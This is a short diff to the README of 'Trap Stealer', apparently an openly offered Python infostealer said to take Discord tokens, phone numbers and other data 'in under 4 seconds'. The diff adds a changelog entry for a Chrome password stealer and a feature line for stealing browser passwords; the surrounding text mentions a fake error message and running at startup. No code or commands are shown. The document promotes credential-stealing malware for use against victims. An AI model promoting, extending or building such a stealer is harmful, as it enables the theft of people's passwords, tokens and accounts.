@@ -5,6 +5,7 @@ Trap Stealer is a Python script that can steal Discord tokens, phone numbers, em
 It steal everything in under 4 seconds
 
 New update added:
+V1.4. Chrome Password and more Stealer
 
 V1.3. Clipboard Stealer
 
@@ -17,6 +18,8 @@ Fix a bug where fake error is still here even in startup
 
 
 ## Features ✨
+
+- Steal Browsers password 🌕
 
 - Clipboard Copy 📋
 
